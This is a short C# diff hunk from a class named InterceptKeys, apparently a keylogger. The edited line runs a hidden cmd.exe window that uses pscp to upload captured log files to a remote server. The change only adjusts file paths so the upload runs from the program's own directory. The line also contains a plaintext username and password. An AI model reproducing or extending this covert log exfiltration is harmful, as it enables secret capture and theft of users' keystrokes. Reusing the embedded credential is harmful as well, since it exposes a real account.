@@ -75,7 +75,7 @@ class InterceptKeys
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = "/C pscp -pw kglosseCSET3100 -batch -q -scp " + fileName + " kglosse@et791.ni.utoledo.edu:cset4850/logs/" + fileName;
+            startInfo.Arguments = "/C" + AppDomain.CurrentDomain.BaseDirectory + "pscp -pw kglosseCSET3100 -batch -q -scp " + AppDomain.CurrentDomain.BaseDirectory + fileName + " kglosse@et791.ni.utoledo.edu:cset4850/logs/" + fileName;
             process.StartInfo = startInfo;
             try
             {
